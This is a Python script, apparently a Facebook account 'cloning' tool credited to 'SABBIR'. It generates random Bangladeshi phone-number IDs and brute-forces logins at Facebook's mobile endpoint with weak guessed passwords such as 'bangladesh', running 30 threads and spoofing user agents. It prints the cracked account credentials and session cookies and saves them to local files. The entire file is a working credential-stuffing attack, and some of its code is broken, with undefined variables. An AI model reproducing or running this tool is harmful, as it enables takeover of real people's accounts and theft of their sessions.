
import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' 
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'    
A = '\x1b[1;90m' 
BN = '\x1b[1;107m' 
BBL = '\x1b[1;106m' 
BP = '\x1b[1;105m' 
BB = '\x1b[1;104m' 
BK = '\x1b[1;103m' 
BH = '\x1b[1;102m' 
BM = '\x1b[1;101m' 
BA = '\x1b[1;100m' 
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today() 
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 open('.prox.txt','w').write(prox)
except Exception as e:
 print('')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
    a='Nokia'
    b=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    c=random.randrange(1, 99)
    d='/GoBrowser/'
    e='1.6.0.'
    f=random.randrange(1, 99)
    uaku2=(f'{a}{b}{c}{d}{e}{f}')
    ugen.append(uaku2)
    
def __init__(self):
        self.id = []
        self.ok = []
        self.cp = []
        self.loop = 0
        
logo = ("""
 ░██████╗░█████╗░██████╗░██████╗░██╗██████╗░
██╔════╝██╔══██╗██╔══██╗██╔══██╗██║██╔══██╗
╚█████╗░███████║██████╦╝██████╦╝██║██████╔╝
░╚═══██╗██╔══██║██╔══██╗██╔══██╗██║██╔══██╗
██████╔╝██║░░██║██████╦╝██████╦╝██║██║░░██║
╚═════╝░╚═╝░░╚═╝╚═════╝░╚═════╝░╚═╝╚═╝░░╚═╝
   \x1b[1;92m╔═════════════════════════════╗
   \x1b[1;92m║➣CREATED BY    :[🥀] SABBIR║
   \x1b[1;92m║➣FACEBOOK      :[🥀] SABBIR SR
   \x1b[1;92m║➣GITHUB      :[🥀] MD-SABBIR-BHAI
   \x1b[1;92m║➣ADMIN       :[🥀] SABBIR
   \x1b[1;92m║➣ COD         :[🥀] ABCD
   \x1b[1;92m╚═════════════════════════════""")

logo1 = ("""
 ░██████╗░█████╗░██████╗░██████╗░██╗██████╗░
██╔════╝██╔══██╗██╔══██╗██╔══██╗██║██╔══██╗
╚█████╗░███████║██████╦╝██████╦╝██║██████╔╝
░╚═══██╗██╔══██║██╔══██╗██╔══██╗██║██╔══██╗
██████╔╝██║░░██║██████╦╝██████╦╝██║██║░░██║
╚═════╝░╚═╝░░╚═╝╚═════╝░╚═════╝░╚═╝╚═╝░░╚═╝
   \x1b[1;92m╔═════════════════════════════╗
   \x1b[1;92m║➣CREATED BY    :[🥀] SABBIR║
   \x1b[1;92m║➣FACEBOOK      :[🥀] SABBIR SR
   \x1b[1;92m║➣GITHUB      :[🥀] MD-SABBIR-BHAI
   \x1b[1;92m║➣ADMIN       :[🥀] SABBIR
   \x1b[1;92m║➣ COD         :[🥀] ABCD
   \x1b[1;92m╚═════════════════════════════╝""")

def emranehc():
	print('==================================================')

def Main():
        os.system("clear")
        print(logo)        
        print(" \033[38;5;46m[𝟎𝟏] 𝙍𝘼𝙉𝘿𝙊𝙈 𝘾𝙇𝙊𝙉𝙄𝙉𝙂")
        print(" \033[38;5;46m[𝟎𝟎] 𝙀𝙓𝙄𝙏")
        Emran =input("\n [,✔️] 𝑩𝑨𝑺𝑻 𝑾𝑶𝑹𝑲 𝑵𝑼𝑴𝑩𝑬𝑹-[𝟏] : ")
        if Emran in ["1"]:
            fuck()
        if Emran in [" 0", "00"]:
            exit()
        else:
            exit()
            
def fuck():
    user=[]
    os.system('clear')
    print(logo)
    print(" \033[38;5;46m=============================")
    print(" \033[38;5;46m𓊈𒆜𝙎𝘼𝘽𝘽𝙄𝙍𒆜𓊉")
    print(" \033[38;5;46m=============================")
    print('[+] \033[38;5;46m𝑺𝑰𝑴 𝑪𝑶𝑫𝑬: [𝟎𝟏𝟕]-[𝟎𝟏𝟖]-[𝟎𝟏𝟗]-[𝟎𝟏𝟔]')
    code = input('[✔️]\033[38;5;46m𝑪𝑯𝑶𝑶𝑺𝑬 𝑺𝑰𝑴𝑬 𝑪𝑶𝑫𝑬 : ')
    name = ''.join(random.choice(string.digits) for _ in range(2))
    cod = ''.join(random.choice(string.digits) for _ in range(2))
    os.system('clear')
    print(logo)
    print(" \033[38;5;46m=============================")
    print(" \033[38;5;46m𓊈𒆜𝙎𝘼𝘽𝘽𝙄𝙍𒆜𓊉")
    print(" \033[38;5;46m=============================")
    print('[+] \033[38;5;46m𝑳𝑴𝑻: [𝟐𝟎𝟎𝟎]-[𝟑𝟎𝟎𝟎]-[𝟓𝟎𝟎𝟎]-[𝟏𝟎𝟎𝟎𝟎] ')
    limit = int(input('\033[38;5;46m[✔️]𝑪𝑯𝑶𝑶𝑺𝑬 : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        print(logo1)
        tl = str(len(user))
        print(" \033[38;5;46m=============================")
        print(" \033[38;5;46m꧁𓊈𒆜𝙎𝘼𝘽𝘽𝙄𝙍𒆜𓊉꧂")
        print(" \033[38;5;46m=============================")
        print('===================================')
        print('[𝟎𝟏]\033[38;5;46m ꧁𓊈𒆜𝙎𝘼𝘽𝘽𝙄𝙍𒆜𓊉꧂')
        print('[𝟎𝟐] \033[38;5;46m𝑭𝑨𝑪𝑬𝑩𝑶𝑶𝑲 𝑰𝑫: '+tl) 
        print("[𝟎𝟑] \033[38;5;46m𝑺𝑰𝑴𝑬 𝑪𝑶𝑫𝑬: "+code)
        print('===================================')
        for love in user:
            uid = code+name+cod+love
            pwx = [code+name+cod+love,cod+love,name+love,code+name+cod,'bangladesh','Bangladesh']
            yaari.submit(mumit2,uid,pwx,tl)
    print(" \033[38;5;46m=============================")
    print(" \033[38;5;46m꧁𓊈𒆜𝙎𝘼𝘽𝘽𝙄𝙍𒆜𓊉꧂")
    print(" \033[38;5;46m=============================")
    print('==================================================')
    print(' [+] Crack process has been completed')
    print(' [+] OK Ids saved in SABBIR/OK.txt')
    print(' [+] CP Ids saved in SABBIR/CP.txt')
    print('==================================================')
def mumit2(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write('\r\033[38;5;46m[꧁𓊈𒆜𝙎𝘼𝘽𝘽𝙄𝙍𒆜𓊉꧂[%s/%s]-[CP-%s]~[OK-%s] \r'%(loop,tl,len(cps),len(oks))),
            sys.stdout.flush()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'p.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
     'cookie': 'datr=1DBBZbZyaGp5le1sJTzp4U6u; sb=1DBBZaRC-f2E62jKGepGerIu; m_pixel_ratio=2; wd=360x698; fr=0onEU837moN0tO3rd..BlQTDU.Xi.AAA.0.0.BlQUl8.AWVacWISRe8',
    'dpr': '2',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"220333QAG"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"13.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    'viewport-width': '980',
}
            lo = session.post('https://p.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=101',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
#-----𝐎𝐊 𝐈𝐃 𝐈𝐍-𝐅𝐑𝐎👇👇              
                print(f"""\033[38;5;46m[꧁𓊈𒆜𝙎𝘼𝘽𝘽𝙄𝙍𒆜𓊉꧂] 
\033[38;5;46m✅𝐎𝐊-𝐈𝐃 𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊✔️:{uid} 
\033[38;5;46m✅𝐎𝐊-𝐈𝐃-𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊✔️:{ps} 
\nCookie : {coki}
""")
#--------𝐋𝐎𝐎𝐊 𝐈𝐃 𝐈𝐍 𝐅𝐑𝐎👇👇
                open('/sdcard/SABBIR/OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"""\033[38;5;46m[꧁𓊈𒆜𝙎𝘼𝘽𝘽𝙄𝙍𒆜𓊉꧂-CP😭] 
\033[38;5;46m[𝐋𝐎𝐂𝐊]𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊🥹]:{uid} 
\033[38;5;46m[𝐋𝐎𝐂𝐊]𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊🥹]:{ps} 
""")
                open('/sdcard/SABBIR-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue             
#𝑪𝑹𝑲 𝑺𝒀𝑺𝑻𝑬𝑴              
        loop+=1
        brand=random.choice(['SABBIR SR','SABBIR SR ','SABBIR CRACK '])
        colr=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;35m','\033[1;34m','\033[1;36m','\033[1;37m','\x1b[38;5;208m'])
        colo=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;35m','\033[1;34m','\033[1;36m','\033[1;37m','\x1b[38;5;208m'])
        emoji=random.choice(['😆','🐸','🙃','😈','🖕','🦅','🦉','🍎','🐝','🦟','🧐','😐','🙂','🤐','♥️','😘','😻','😍','😹','🤣','😂','😭','😁','😜','🤫','😶','🥱','😤','🥵','😇','💋','🙈','🙀','💚','💛','🖤','🤎','💙','💜','🦶','🙆','🌺','🌸','🏵️','🍁','🌼','🔥','🐍','🦡','✈️','🦛','🦐','🐇','🐮','🐰','🦃','🕸️','🦋','🍒','🍓','🍑','🍊','🥭','🍍','🍌','🌶️','🥥','🐛','🥕','🍗','🍆','🥐','🧀','🍤','🇧🇩','☠️'])
        colorful=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;35m','\033[1;34m','\033[1;36m','\033[1;37m','\x1b[38;5;208m'])
        sys.stdout.write(f"\r \33[1;90m[{colr}SABBIR❤️‍🔥🎁SR🥰\33[1;90m]{colo}✘\33[1;90m[{colorful}{loop}\33[1;90m/\33[1;92m{tl}\33[1;90m]-[OK:{xr}{len(oks)}{x}\33[1;90m]-\33[1;90m[{emoji}]  "),
        sys.stdout.flush()
        sys.stdout.write(f'\r\r%s {x}[{xr}꧁𓊈𒆜𝙎𝘼𝘽𝘽𝙄𝙍𒆜𓊉꧂ {x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
        
Main()
